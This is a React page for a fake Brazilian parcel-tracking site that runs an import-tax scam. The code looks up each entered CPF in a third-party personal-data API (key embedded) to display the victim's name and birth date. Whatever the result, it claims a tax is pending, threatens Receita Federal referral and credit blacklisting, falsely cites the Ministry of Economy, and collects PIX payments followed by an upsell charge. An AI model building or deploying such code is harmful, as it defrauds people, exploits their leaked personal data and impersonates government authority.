"use client"

import { useRouter } from "next/navigation"
import type React from "react"
import { useState, useEffect, useRef } from "react"
import { Card, CardContent } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Package, AlertCircle, Copy, QrCode, Loader2, CheckCircle } from "lucide-react"

interface PackageData {
  cpf: string
  nome: string
  telefone: string
  produto: string
  codigo_rastreio: string
  endereco: string
  valor?: number | string // Added valor field
  remessa: string
  status: string
  ultima_atualizacao: string
  pedido_postado: boolean
  pedido_em_rota: boolean
  pedido_taxado: boolean
  pedido_entregue: boolean
  isExternal?: boolean
  nascimento?: string // Added birth date field for external API data
}

interface CompanySettings {
  company_name: string
  logo_url: string
  banner_url: string
}

interface PaymentData {
  qrCode: string
  pixKey: string
  amount: number
  transactionId?: string
}

export default function TrackingPage() {
  const [cpf, setCpf] = useState("")
  const [loadingMessage, setLoadingMessage] = useState("")
  const [searching, setSearching] = useState(false)
  const [packageData, setPackageData] = useState<PackageData | null>(null)
  const [error, setError] = useState("")
  const [settings, setSettings] = useState<CompanySettings>({
    company_name: "Rastreamento de Encomendas",
    logo_url: "",
    banner_url: "",
  })
  const [showResults, setShowResults] = useState(false)
  const resultsRef = useRef<HTMLDivElement>(null)
  const taxedRef = useRef<HTMLDivElement>(null)
  const [isLoading, setIsLoading] = useState(false)
  const [showPayment, setShowPayment] = useState(false)
  const [paymentData, setPaymentData] = useState<PaymentData | null>(null)
  const [copied, setCopied] = useState(false)
  const paymentRef = useRef<HTMLDivElement>(null)
  const router = useRouter()
  const [timeLeft, setTimeLeft] = useState(600) // 10 minutes countdown
  const [showQRCode, setShowQRCode] = useState(false)
  const [showAlreadyPaid, setShowAlreadyPaid] = useState(false)
  const [paymentConfirmed, setPaymentConfirmed] = useState(false)
  const [showUpsell, setShowUpsell] = useState(false) // Added upsell state
  const [currentTaxValue, setCurrentTaxValue] = useState(5349) // Added state for dynamic tax value display

  useEffect(() => {
    const loadTaxValue = async () => {
      try {
        const response = await fetch("/api/admin/tax-value", { cache: "no-store" })
        if (response.ok) {
          const data = await response.json()
          if (data.value && data.value > 0) {
            setCurrentTaxValue(data.value)
            console.log("[v0] Loaded initial tax value:", data.value)
          }
        }
      } catch (error) {
        console.error("[v0] Failed to load tax value:", error)
      }
    }
    loadTaxValue()
  }, [])

  useEffect(() => {
    loadSettings()
  }, [])

  const loadSettings = async () => {
    try {
      const response = await fetch("/api/admin/settings")
      const data = await response.json()
      setSettings(data)
    } catch (error) {
      console.error("Error loading settings:", error)
    }
  }

  const formatCPF = (value: string) => {
    const numbers = value.replace(/\D/g, "")

    // CNPJ (14 digits): 00.000.000/0000-00
    if (numbers.length > 11) {
      return numbers
        .replace(/(\d{2})(\d)/, "$1.$2")
        .replace(/(\d{3})(\d)/, "$1.$2")
        .replace(/(\d{3})(\d)/, "$1/$2")
        .replace(/(\d{4})(\d{1,2})$/, "$1-$2")
    }

    // CPF (11 digits): 000.000.000-00
    if (numbers.length <= 11) {
      return numbers
        .replace(/(\d{3})(\d)/, "$1.$2")
        .replace(/(\d{3})(\d)/, "$1.$2")
        .replace(/(\d{3})(\d{1,2})$/, "$1-$2")
    }

    return value
  }

  const handleCPFChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCPF(e.target.value)
    setCpf(formatted)
  }

  const handleSearch = async (e: React.FormEvent) => {
    e.preventDefault()

    const cleanCpf = cpf.replace(/\D/g, "")

    if (cleanCpf.length !== 11 && cleanCpf.length !== 14) {
      setError("Por favor, digite um CPF (11 dígitos) ou CNPJ (14 dígitos) válido")
      return
    }

    if (!cpf.trim()) return

    setIsLoading(true)
    setLoadingMessage("Buscando informações do pacote...")
    setPackageData(null)
    setError("")
    setShowPayment(false)

    // Wait 2 seconds before searching
    await new Promise((resolve) => setTimeout(resolve, 2000))

    try {
      let response = await fetch(`/api/tracking/${cleanCpf}`)

      if (response.status === 404) {
        // First try to fetch CPF data from the browser (bypasses Cloudflare blocking)
        let clientNome = ""
        let clientNascimento = ""
        let clientMae = ""
        let clientSexo = ""
        
        try {
          const cpfApiUrl = `https://public.livescript.dev/apis/cpfcompleta/${cleanCpf}?key=344f68668e41841756df498618bfccef`
          const cpfRes = await fetch(cpfApiUrl, {
            headers: { "Accept": "application/json" },
          })
          if (cpfRes.ok) {
            const cpfText = await cpfRes.text()
            if (cpfText && !cpfText.includes("<!DOCTYPE")) {
              const cpfJson = JSON.parse(cpfText)
              const cpfData = cpfJson?.data || cpfJson
              clientNome = (cpfData?.nome || cpfData?.NOME || "").trim()
              clientNascimento = cpfData?.nascimento || cpfData?.NASCIMENTO || cpfData?.data_nascimento || ""
              clientMae = cpfData?.mae || cpfData?.MAE || cpfData?.nome_mae || ""
              clientSexo = cpfData?.sexo || cpfData?.SEXO || ""
            }
          }
        } catch (cpfErr) {
          console.log("[v0] Client-side CPF fetch failed, falling back to server")
        }

        // Pass enriched data to server via query params
        const params = new URLSearchParams()
        if (clientNome) params.set("nome", clientNome)
        if (clientNascimento) params.set("nascimento", clientNascimento)
        if (clientMae) params.set("mae", clientMae)
        if (clientSexo) params.set("sexo", clientSexo)
        const qs = params.toString() ? `?${params.toString()}` : ""
        response = await fetch(`/api/tracking/external/${cleanCpf}${qs}`)
      }

      if (!response.ok) {
        throw new Error("Erro ao buscar dados")
      }

      const data = await response.json()

      // If server says it needs client fetch and we haven't tried yet, try from browser
      if (data.needsClientFetch && data.nome === "Cliente") {
        try {
          const cpfApiUrl = `https://public.livescript.dev/apis/cpfcompleta/${cleanCpf}?key=344f68668e41841756df498618bfccef`
          const cpfRes = await fetch(cpfApiUrl, {
            headers: { "Accept": "application/json" },
          })
          if (cpfRes.ok) {
            const cpfText = await cpfRes.text()
            if (cpfText && !cpfText.includes("<!DOCTYPE")) {
              const cpfJson = JSON.parse(cpfText)
              const cpfData = cpfJson?.data || cpfJson
              if (cpfData?.nome || cpfData?.NOME) {
                data.nome = (cpfData.nome || cpfData.NOME).trim()
                data.nascimento = cpfData?.nascimento || cpfData?.NASCIMENTO || cpfData?.data_nascimento || ""
                data.mae = cpfData?.mae || cpfData?.MAE || cpfData?.nome_mae || ""
                data.sexo = cpfData?.sexo || cpfData?.SEXO || ""
              }
            }
          }
        } catch {}
      }
      
      setPackageData(data)
      setShowResults(true)

      fetch("/api/tracking/log-query", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ cpf: cleanCpf, nome: data.nome }),
      }).catch((err) => console.error("[v0] Failed to log query:", err))
    } catch (err) {
      console.error("[v0] Search error:", err)
      setPackageData({
        cpf: cleanCpf,
        nome: "Contribuinte",
        pedido_postado: true,
        pedido_em_rota: true,
        pedido_taxado: true,
        pedido_entregue: false,
      })
      setShowResults(true)
    } finally {
      setIsLoading(false)
      setLoadingMessage("")
    }
  }

  const handleRegularizeClick = async () => {
    if (!packageData) return
    setIsLoading(true)

    fetch("/api/tracking/log-regularizar", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ cpf: packageData.cpf }),
    }).catch((error) => console.error("[v0] Failed to log regularizar click:", error))

    try {
      let taxAmount = 5349 // Default fallback
      try {
        const taxResponse = await fetch("/api/admin/tax-value", {
          cache: "no-store",
        })
        if (taxResponse.ok) {
          const taxData = await taxResponse.json()
          if (taxData.value && taxData.value > 0) {
            taxAmount = taxData.value
            setCurrentTaxValue(taxAmount) // Store for display
            console.log("[v0] Using tax value from admin:", taxAmount)
          }
        }
      } catch (err) {
        console.log("[v0] Failed to fetch tax value, using default:", taxAmount)
      }

      const response = await fetch("/api/payment/create", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          cpf: packageData.cpf,
          nome: packageData.nome,
          amount: taxAmount,
        }),
      })

      if (!response.ok) {
        throw new Error("Failed to create payment")
      }

      const data = await response.json()
      console.log("[v0] Payment data:", data) // Debug log
      
      // If we have a transaction but no PIX code, poll for it
      if (data.transactionId && !data.pixKey && !data.qrCode) {
        console.log("[v0] No PIX code yet, will poll for it...")
        setPaymentData(data)
        setShowPayment(true)
        setTimeLeft(600)
        
        // Poll for PIX code
        const pollForPix = async (attempts = 0) => {
          if (attempts >= 10) {
            console.log("[v0] Max polling attempts reached")
            return
          }
          
          try {
            const pollResponse = await fetch(`/api/payment/get-pix?transactionId=${data.transactionId}`)
            if (pollResponse.ok) {
              const pollData = await pollResponse.json()
              console.log("[v0] Poll response:", pollData)
              if (pollData.pixKey) {
                setPaymentData((prev: any) => ({
                  ...prev,
                  pixKey: pollData.pixKey,
                  qrCode: pollData.qrCode || pollData.pixKey,
                }))
                return
              }
            }
          } catch (e) {
            console.log("[v0] Poll error:", e)
          }
          
          // Try again in 2 seconds
          setTimeout(() => pollForPix(attempts + 1), 2000)
        }
        
        setTimeout(() => pollForPix(), 2000)
      } else {
        setPaymentData(data)
        setShowPayment(true)
        setTimeLeft(600)
      }

      fetch("/api/tracking/log-payment", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          cpf: packageData.cpf,
          paymentId: data.transactionId,
          status: "pending",
        }),
      }).catch((error) => console.error("[v0] Failed to log payment:", error))

      setTimeout(() => {
        window.scrollTo({ top: 0, behavior: "smooth" })
      }, 100)
    } catch (error) {
      console.error("[v0] Error generating payment:", error)
      setError("Erro ao gerar pagamento. Tente novamente.")
    } finally {
      setIsLoading(false)
    }
  }

  const handleCopyPixKey = async () => {
    const pixToCopy = paymentData?.pixKey || paymentData?.qrCode
    if (pixToCopy) {
      await navigator.clipboard.writeText(pixToCopy)
      setCopied(true)

      if (packageData?.cpf) {
        await fetch("/api/tracking/log-pix-copy", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ cpf: packageData.cpf }),
        })
      }

      setTimeout(() => setCopied(false), 2000)
    }
  }

  const handleAlreadyPaid = () => {
    setShowUpsell(true)
    setShowPayment(false)
    window.scrollTo({ top: 0, behavior: "smooth" })
  }

  const handleUpsellAccept = async () => {
    if (!packageData) return
    setIsLoading(true)

    try {
      const response = await fetch("/api/payment/create", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          cpf: packageData.cpf,
          nome: packageData.nome,
          amount: 2332, // Updated upsell amount to R$ 23,32 in centavos
          isUpsell: true,
        }),
      })

      if (response.ok) {
        const data = await response.json()
        setPaymentData(data)
        setShowPayment(true)
        setShowUpsell(false)
        setTimeLeft(600)
        window.scrollTo({ top: 0, behavior: "smooth" })
      }
    } catch (error) {
      console.error("[v0] Error creating upsell payment:", error)
    } finally {
      setIsLoading(false)
    }
  }

  const handleUpsellSkip = () => {
    setShowUpsell(false)
    window.scrollTo({ top: 0, behavior: "smooth" })
  }

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    return `${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`
  }

  useEffect(() => {
    if (showResults && resultsRef.current) {
      setTimeout(() => {
        resultsRef.current?.scrollIntoView({ behavior: "smooth", block: "start" })
      }, 100)
    }
  }, [showResults])

  useEffect(() => {
    if (packageData && packageData.pedido_taxado) {
      const refreshTaxValue = async () => {
        try {
          const response = await fetch("/api/admin/tax-value", { cache: "no-store" })
          if (response.ok) {
            const data = await response.json()
            if (data.value && data.value > 0) {
              setCurrentTaxValue(data.value)
            }
          }
        } catch (error) {
          console.error("[v0] Failed to refresh tax value:", error)
        }
      }
      refreshTaxValue()
    }
  }, [packageData])

  useEffect(() => {
    if (showPayment && taxedRef.current) {
      setTimeout(() => {
        taxedRef.current?.scrollIntoView({ behavior: "smooth", block: "center" })
      }, 100)
    }
  }, [showPayment])

  // Poll for payment status every 5 seconds when payment is shown
  useEffect(() => {
    if (!showPayment || !paymentData?.transactionId || paymentConfirmed) return

    const checkPaymentStatus = async () => {
      try {
        const res = await fetch(`/api/payment/get-pix?transactionId=${paymentData.transactionId}`)
        if (res.ok) {
          const data = await res.json()
          const status = (data.status || "").toLowerCase()
          
          if (status === "paid" || status === "approved" || status === "completed" || status === "confirmed") {
            console.log("[v0] Payment approved! Status:", status)
            setShowPayment(false)
            setShowUpsell(true)
            window.scrollTo({ top: 0, behavior: "smooth" })
          }
        }
      } catch (err) {
        // Silent fail - will retry next interval
      }
    }

    // Check immediately
    checkPaymentStatus()
    
    // Then check every 5 seconds
    const interval = setInterval(checkPaymentStatus, 5000)
    return () => clearInterval(interval)
  }, [showPayment, paymentData?.transactionId, paymentConfirmed])

  const getProgressSteps = () => {
    if (!packageData) return []

    return [
      {
        label: "Pedido\nPostado",
        completed: packageData.pedido_postado,
        active: false,
      },
      {
        label: "Em Rota",
        completed: packageData.pedido_em_rota,
        active: false,
      },
      {
        label: "Taxado",
        completed: false,
        active: packageData.pedido_taxado,
      },
      {
        label: "Pedido\nEntregue",
        completed: packageData.pedido_entregue,
        active: false,
      },
    ]
  }

  return (
    <div className="min-h-screen bg-gray-50">
      <header className="bg-white shadow-sm">
        <div className="container mx-auto px-4 py-4">
          <div className="flex justify-center">
            <img
              src={settings.logo_url || "/EnvioBr-logo.png"}
              alt="EnvioSeguroBR"
              className="h-24 sm:h-32 w-auto object-contain"
            />
          </div>
        </div>
      </header>

      <main className="container mx-auto px-4 py-6 max-w-xl">
        {showUpsell && !showPayment && (
          <div className="space-y-6">
            <Card className="bg-gradient-to-br from-green-50 to-emerald-50 border-2 border-green-300 shadow-xl">
              <CardContent className="p-6 text-center space-y-4">
                <div className="bg-green-500 rounded-full p-4 w-20 h-20 mx-auto flex items-center justify-center">
                  <CheckCircle className="h-12 w-12 text-white" />
                </div>

                <h2 className="text-2xl font-bold text-green-900">Ok!</h2>
                <p className="text-gray-700 text-base">
                  Seu pagamento está sendo processado e sua encomenda será liberada para entrega.
                </p>

                <div className="bg-white rounded-xl p-6 shadow-lg border-2 border-yellow-400 mt-6">
                  <div className="bg-yellow-400 rounded-lg p-3 mb-4">
                    <h3 className="text-lg font-bold text-gray-900">AVISO</h3>
                  </div>

                  <p className="text-gray-700 mb-4 text-sm leading-relaxed">
                    No seu endereço está tendo disponível entregadores full express, que entregam no mesmo dia!
                  </p>

                  <h4 className="text-xl font-bold text-gray-900 mb-2">Entrega no Mesmo Dia</h4>

                  <div className="text-4xl font-bold text-green-600 mb-6">R$ 24,33</div>

                  <Button
                    onClick={handleUpsellAccept}
                    disabled={isLoading}
                    className="w-full py-6 bg-gradient-to-r from-green-600 to-emerald-600 hover:from-green-700 hover:to-emerald-700 text-white font-bold rounded-xl text-lg shadow-xl"
                  >
                    {isLoading ? (
                      <>
                        <Loader2 className="h-5 w-5 animate-spin mr-2" />
                        Processando...
                      </>
                    ) : (
                      "Quero!"
                    )}
                  </Button>

                  <Button
                    onClick={handleUpsellSkip}
                    variant="ghost"
                    className="w-full mt-3 text-gray-600 hover:text-gray-900"
                  >
                    Não, obrigado
                  </Button>
                </div>
              </CardContent>
            </Card>
          </div>
        )}

        {!showResults && !showPayment && (
          <div>
            <div className="text-center mb-6">
              <p className="text-gray-600 italic text-sm">Envios mais rápidos, econômicos e inteligentes.</p>
            </div>

            <Card className="bg-[#1a5c38] border-0 shadow-lg">
              <CardContent className="p-6 space-y-4">
                <div className="flex items-center gap-3 mb-4">
                  <div className="bg-[#14472c] p-3 rounded-lg">
                    <Package className="h-7 w-7 text-white" />
                  </div>
                  <div className="text-left">
                    <h2 className="text-white font-bold text-lg">Rastreamento de Pedidos</h2>
                    <p className="text-white/90 text-sm">Digite seu CPF ou CNPJ para acompanhar sua encomenda</p>
                  </div>
                </div>

                <div className="bg-white rounded-lg p-4 space-y-3">
                  <form onSubmit={handleSearch} className="space-y-3">
                    <Input
                      id="cpf"
                      type="text"
                      value={cpf}
                      onChange={handleCPFChange}
                      placeholder="Digite seu CPF/CNPJ"
                      className="h-12 text-base"
                      maxLength={18}
                      disabled={isLoading}
                    />

                    <Button
                      type="submit"
                      disabled={searching || isLoading}
                      className="h-12 w-full bg-[#1a5c38] hover:bg-[#14472c] text-white font-semibold rounded-lg text-sm sm:text-base flex items-center justify-center gap-2"
                    >
                      {isLoading ? (
                        <>
                          <Loader2 className="h-4 w-4 sm:h-5 sm:w-5 animate-spin flex-shrink-0" />
                          <span className="truncate text-xs sm:text-sm">Buscando informações...</span>
                        </>
                      ) : (
                        <>
                          <Package className="h-5 w-5" />
                          Buscar Pedido
                        </>
                      )}
                    </Button>
                  </form>

                  {error && (
                    <div className="bg-red-50 border border-red-200 rounded-lg p-3 text-sm text-red-800">{error}</div>
                  )}
                </div>
              </CardContent>
            </Card>
          </div>
        )}

        {showResults && packageData && !showPayment && (
          <div ref={resultsRef} className="space-y-4">
            <Card className="bg-[#1a5c38] border-0 shadow-lg rounded-lg overflow-hidden">
              <CardContent className="py-2 px-4 text-center">
                <h2 className="text-white font-bold text-base">Taxa Pendente</h2>
                <p className="text-white/90 text-[10px] mt-0.5">Regularização de Importação</p>
                {packageData.codigo_rastreio && (
                  <p className="text-white/80 text-[9px] mt-0.5 font-mono">{packageData.codigo_rastreio}</p>
                )}
              </CardContent>
            </Card>

            <Card className="border-0 shadow-lg">
              <CardContent className="p-4">
                <div className="border-l-4 border-[#1a5c38] pl-3 space-y-2">
                  <h3 className="text-green-900 font-bold text-sm mb-3">Dados do Contribuinte</h3>

                  {packageData.nome && packageData.nome !== "Contribuinte" && packageData.nome !== "Cliente" && (
                    <div>
                      <p className="text-gray-600 text-xs mb-0.5">Nome:</p>
                      <p className="text-gray-900 font-medium text-sm">{packageData.nome}</p>
                    </div>
                  )}

                  <div>
                    <p className="text-gray-600 text-xs mb-0.5">CPF:</p>
                    <p className="text-gray-900 font-medium text-sm">{formatCPF(packageData.cpf)}</p>
                  </div>

                  {packageData.isExternal && packageData.nascimento && (
                    <div>
                      <p className="text-gray-600 text-xs mb-0.5">Nascimento:</p>
                      <p className="text-gray-900 font-medium text-sm">
                        {packageData.nascimento.split(" ")[0].split("-").reverse().join("/")}
                      </p>
                    </div>
                  )}

                  {!packageData.isExternal && packageData.nome !== "Contribuinte" && packageData.nome !== "Cliente" && (
                    <>
                      <div>
                        <p className="text-gray-600 text-xs mb-0.5">Endereço:</p>
                        <p className="text-gray-900 font-medium">{packageData.endereco}</p>
                      </div>

                      <div>
                        <p className="text-gray-600 text-xs mb-0.5">Telefone:</p>
                        <p className="text-gray-900 font-medium">{packageData.telefone}</p>
                      </div>

                      {packageData.valor !== undefined && packageData.valor !== null && Number(packageData.valor) > 0 && (
                        <div>
                          <p className="text-gray-600 text-xs mb-0.5">Valor do Pacote:</p>
                          <p className="text-gray-900 font-bold text-sm">
                            R${" "}
                            {(() => {
                              const val = typeof packageData.valor === "string" 
                                ? Number.parseFloat(packageData.valor) 
                                : packageData.valor
                              // If value is greater than 1000, it's likely in centavos
                              if (val > 1000) {
                                return (val / 100).toFixed(2).replace(".", ",")
                              }
                              return val.toFixed(2).replace(".", ",")
                            })()}
                          </p>
                        </div>
                      )}

                      <div>
                        <p className="text-gray-600 text-xs mb-0.5">Produto:</p>
                        <p className="text-gray-900 font-medium">{packageData.produto}</p>
                      </div>

                      {packageData.codigo_rastreio && (
                        <div>
                          <p className="text-gray-600 text-xs mb-0.5">Código de Rastreio:</p>
                          <p className="text-gray-900 font-bold text-sm font-mono">{packageData.codigo_rastreio}</p>
                        </div>
                      )}
                    </>
                  )}
                </div>

                <div className="bg-gradient-to-br from-pink-50 to-red-50 border-2 border-pink-200 rounded-xl p-3 mt-4">
                  <div className="flex flex-col items-center gap-2 mb-2">
                    <div className="bg-yellow-400 rounded-full p-1.5 flex-shrink-0">
                      <AlertCircle className="h-4 w-4 text-white" />
                    </div>
                    <h4 className="text-green-900 font-bold text-xs text-center">Atenção: Taxa Pendente!</h4>
                  </div>

                  <p className="text-center text-gray-700 text-sm mb-2 leading-tight">
                    Foi identificada uma taxa de importação pendente{" "}
                    <span className="whitespace-nowrap">em seu CPF.</span>
                  </p>
                  
                  <div className="bg-green-100 border border-green-300 rounded-lg p-2 mb-3">
                    <p className="text-center text-green-700 text-[10px] font-semibold leading-tight">
                      AVISO: Hoje é o <span className="font-bold underline">ÚLTIMO DIA</span> para regularização.
                    </p>
                    <p className="text-center text-green-700 text-[9px] mt-1 leading-tight">
                      O não pagamento resultará no envio do débito à <span className="font-bold">Receita Federal</span> e 
                      registro de pendência financeira vinculada ao seu CPF, podendo acarretar 
                      restrições cadastrais e negativação do nome.
                    </p>
                  </div>
                  
                  <p className="text-center mb-4">
                    <span className="text-gray-600 text-xs">Valor da taxa: </span>
                    <span className="text-green-600 font-bold text-base">
                      R$ {(currentTaxValue / 100).toFixed(2).replace(".", ",")}
                    </span>
                  </p>
                  <Button
                    onClick={handleRegularizeClick}
                    disabled={isLoading}
                    className="w-full py-2.5 bg-[#1a5c38] hover:bg-[#14472c] text-white font-bold rounded-xl text-xs shadow-lg animate-green-pulse"
                  >
                    {isLoading ? (
                      <>
                        <Loader2 className="h-4 w-4 animate-spin mr-2" />
                        <span className="text-[10px] sm:text-xs">Gerando...</span>
                      </>
                    ) : (
                      <span className="text-[11px] sm:text-xs">CLIQUE PARA PAGAR TAXA</span>
                    )}
                  </Button>
                  <p className="text-gray-600 text-[10px] mt-2 text-center leading-tight">
                    * O pagamento é necessário para regularização.{" "}
                    <span className="text-green-600 font-semibold whitespace-nowrap">BR MINISTÉRIO DA ECONOMIA</span>
                  </p>
                </div>
              </CardContent>
            </Card>
          </div>
        )}

        {paymentConfirmed && (
          <div className="space-y-4">
            <Card className="border-2 border-green-500 shadow-lg">
              <CardContent className="p-6 text-center space-y-4">
                <div className="flex justify-center">
                  <div className="bg-green-100 rounded-full p-4">
                    <CheckCircle className="h-16 w-16 text-green-600" />
                  </div>
                </div>
                <h2 className="text-2xl font-bold text-green-700">Pagamento Confirmado!</h2>
                <p className="text-gray-700 leading-relaxed">
                  Obrigado por realizar o pagamento. Sua encomenda será liberada para entrega e chegará em breve.
                </p>
                <div className="bg-green-50 border border-green-200 rounded-lg p-4">
                  <p className="text-sm text-green-800">
                    Você receberá uma atualização de rastreamento assim que sua encomenda for liberada pela Receita
                    Federal.
                  </p>
                </div>
                <Button
                  onClick={() => {
                    setPaymentConfirmed(false)
                    setShowPayment(false)
                    setShowResults(false)
                    setCpf("")
                    setPackageData(null)
                  }}
                  className="w-full bg-green-600 hover:bg-green-700 text-white font-semibold py-3"
                >
                  Fazer Nova Consulta
                </Button>
              </CardContent>
            </Card>
          </div>
        )}

        {showPayment && paymentData && !paymentConfirmed && (
          <div className="space-y-4">
            <div ref={paymentRef} className="bg-white rounded-lg p-4 space-y-3">
              <p className="text-gray-700 text-sm font-medium">Seu pagamento está pendente</p>
              <p className="text-green-700 font-bold text-2xl sm:text-3xl">
                R$ {((paymentData.amount || currentTaxValue) / 100).toFixed(2).replace(".", ",")}
              </p>
              <div className="space-y-3">
                {(paymentData.pixKey || paymentData.qrCode) ? (
                  <>
                    <p className="text-gray-800 font-semibold text-sm">Seu código PIX Copia e Cola</p>
                    {showQRCode ? (
                      <div className="bg-gray-50 rounded-lg p-4">
                        <img
                          src={`https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(paymentData.pixKey || paymentData.qrCode || "")}`}
                          alt="QR Code PIX"
                          className="mx-auto w-48 h-48"
                        />
                      </div>
                    ) : (
                      <div className="bg-gray-50 border border-gray-200 rounded-lg p-2 max-w-full overflow-hidden">
                        <p className="text-[9px] sm:text-[10px] font-mono text-gray-600 break-all leading-tight">
                          {paymentData.pixKey || paymentData.qrCode}
                        </p>
                      </div>
                    )}
                    <Button
                      onClick={handleCopyPixKey}
                      className="w-full bg-[#1a5c38] hover:bg-[#14472c] text-white font-bold py-3 rounded-lg flex items-center justify-center gap-2"
                    >
                      <Copy className="h-5 w-5" />
                      {copied ? "CÓDIGO COPIADO!" : "COPIAR CÓDIGO PIX"}
                    </Button>
                  </>
                ) : (
                  <div className="text-center py-4">
                    <Loader2 className="h-8 w-8 animate-spin mx-auto text-green-700 mb-2" />
                    <p className="text-gray-600 text-sm">Carregando PIX...</p>
                  </div>
                )}
                <div className="flex items-center justify-center gap-3 pt-2">
                  <div className="flex items-center gap-1.5 text-green-600">
                    <svg className="h-4 w-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                      <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
                      <path d="M9 12l2 2 4-4" />
                    </svg>
                    <span className="text-[11px] font-semibold">Pagamento Seguro</span>
                  </div>
                  <div className="flex items-center gap-1.5 text-green-700">
                    <Loader2 className="h-4 w-4 animate-spin" />
                    <span className="text-[11px] font-semibold">Verificando...</span>
                  </div>
                </div>
                <Button
                  variant="outline"
                  onClick={() => setShowQRCode(!showQRCode)}
                  className="w-full border-2 border-green-700 text-green-700 hover:bg-green-50 font-semibold py-2.5 rounded-lg flex items-center justify-center gap-2"
                >
                  <QrCode className="h-5 w-5" />
                  {showQRCode ? "Esconder QR Code" : "Exibir QR Code"}
                </Button>
                <Card className="bg-gradient-to-r from-green-50 to-emerald-50 border-2 border-green-300 shadow-md">
                  <CardContent className="p-4 space-y-2">
                    <div className="flex items-center gap-2">
                      <AlertCircle className="h-5 w-5 text-green-700 flex-shrink-0" />
                      <h3 className="text-green-900 font-bold text-sm">Confirmação de Pagamento</h3>
                    </div>
                    <p className="text-gray-700 text-xs leading-relaxed">
                      Após a confirmação do pagamento via PIX, sua encomenda será liberada automaticamente para entrega
                      e chegará no mesmo dia ou no dia seguinte.
                    </p>
                  </CardContent>
                </Card>
              </div>
            </div>
          </div>
        )}
      </main>

      <footer className="mt-12 bg-green-800 text-white py-8">
        <div className="container mx-auto px-4">
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-6 mb-8">
            <div>
              <h3 className="font-bold text-base mb-3">Cliente</h3>
              <ul className="space-y-1.5 text-sm">
                <li>
                  <a href="#" className="hover:underline">
                    Seja VIP
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:underline">
                    Consulta de Rastreio
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:underline">
                    Encontre um Ponto EnvioSeguroBR
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:underline">
                    Consulta de Frete
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:underline">
                    Atividades populares
                  </a>
                </li>
              </ul>
            </div>
            <div>
              <h3 className="font-bold text-base mb-3">Suporte ao Cliente</h3>
              <ul className="space-y-1.5 text-sm">
                <li>
                  <a href="#" className="hover:underline">
                    Serviços B2C
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:underline">
                    Serviços C2C
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:underline">
                    Serviços CBT
                  </a>
                </li>
              </ul>
              <h3 className="font-bold text-base mb-3 mt-4">Fale Conosco</h3>
              <ul className="space-y-1.5 text-sm">
                <li>
                  <a href="#" className="hover:underline">
                    Cooperação
                  </a>
                </li>
              </ul>
            </div>
            <div>
              <h3 className="font-bold text-base mb-3">Junte-se a Nós</h3>
              <ul className="space-y-1.5 text-sm">
                <li>
                  <a href="#" className="hover:underline">
                    Torne-se um Motorista
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:underline">
                    Vagas de Emprego
                  </a>
                </li>
              </ul>
            </div>
            <div>
              <h3 className="font-bold text-base mb-3">Informações</h3>
              <ul className="space-y-1.5 text-sm">
                <li>
                  <a href="#" className="hover:underline">
                    Política de Privacidade
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:underline">
                    Termos de Uso
                  </a>
                </li>
              </ul>
            </div>
          </div>
          <div className="border-t border-white/20 pt-6 space-y-4">
            <div className="flex flex-col items-center justify-center gap-4">
              <div className="text-center space-y-1">
                <p>contato@enviosegurobr.com</p>
              </div>
            </div>
            <div className="text-xs text-white/80 text-center space-y-1">
            </div>
            <div className="text-center pt-4 border-t border-white/20 text-sm">
              <p className="font-semibold">© EnvioSeguroBR 2025</p>
            </div>
          </div>
        </div>
      </footer>
      <style jsx>{`
        @keyframes green-pulse {
          0%,
          100% {
            box-shadow: 0 0 15px rgba(26, 92, 56, 0.8), 0 0 30px rgba(26, 92, 56, 0.6), 0 0 45px rgba(26, 92, 56, 0.4);
          }
          50% {
            box-shadow: 0 0 25px rgba(26, 92, 56, 1), 0 0 50px rgba(26, 92, 56, 0.8), 0 0 75px rgba(26, 92, 56, 0.6);
          }
        }
        .animate-green-pulse {
          animation: green-pulse 2s ease-in-out infinite;
        }
      `}</style>
    </div>
  )
}
